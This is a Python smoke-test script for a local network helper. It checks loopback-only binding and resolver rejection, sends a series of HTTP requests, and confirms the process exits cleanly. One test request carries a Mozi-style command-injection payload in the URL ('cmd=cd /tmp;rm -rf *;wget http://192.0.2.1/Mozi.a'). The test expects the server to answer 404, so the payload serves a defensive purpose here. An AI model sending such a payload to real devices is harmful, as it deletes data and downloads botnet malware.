#!/usr/bin/env python3
"""Real process/socket smoke. Never invoke a shell with hostile request text."""
import http.client
import json
import subprocess
import sys
import tempfile
import urllib.parse
from pathlib import Path

helper = str(Path(sys.argv[1]).resolve())
for bind in ('0.0.0.0', '8.8.8.8', '::', 'localhost'):
    p = subprocess.run([helper, '--bind', bind], capture_output=True, timeout=5)
    assert p.returncode != 0, (bind, p.stdout)
for resolver in ('0.0.0.0:53', '192.0.2.1:53', 'localhost:53', '[::]:53'):
    p = subprocess.run([helper, '--dns-resolver='+resolver], capture_output=True, timeout=5)
    assert p.returncode != 0, (resolver, p.stdout)
with tempfile.TemporaryFile(mode='w+') as log:
    p = subprocess.Popen([helper], stdout=subprocess.PIPE, stderr=log, text=True)
    try:
        import select
        assert select.select([p.stdout], [], [], 10)[0], 'startup timeout'
        info = json.loads(p.stdout.readline())
        u = urllib.parse.urlparse(info['controlURL'])
        assert u.hostname == '127.0.0.1'
        for region in info['derpMap']['Regions'].values():
            for node in region['Nodes']:
                assert node['IPv4'] == '127.0.0.1'
        for method, path, body, status in [
            ('GET', '/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.0.2.1/Mozi.a', None, 404),
            ('POST', '/machine/unknown', None, 404),
            ('GET', '/key', b'x' * ((1 << 20) + 1), 413),
            ('GET', '/healthz', None, 200),
            ('GET', '/key?v=130', None, 200),
        ]:
            c = http.client.HTTPConnection(u.hostname, u.port, timeout=5)
            if status == 413:
                c.putrequest(method, path)
                c.putheader('Content-Length', str(len(body)))
                c.endheaders()
            else:
                c.request(method, path, body=body)
            response = c.getresponse()
            assert response.status == status, (path, response.status)
            response.read()
            c.close()
        assert p.poll() is None, 'helper died'
    finally:
        p.terminate()
        try:
            p.wait(timeout=8)
        except subprocess.TimeoutExpired:
            p.kill(); p.wait(); raise
        log.seek(0); print(log.read())
    assert p.returncode == 0, p.returncode
print('PASS: process survived hostile HTTP; default loopback; SIGTERM cleanup')
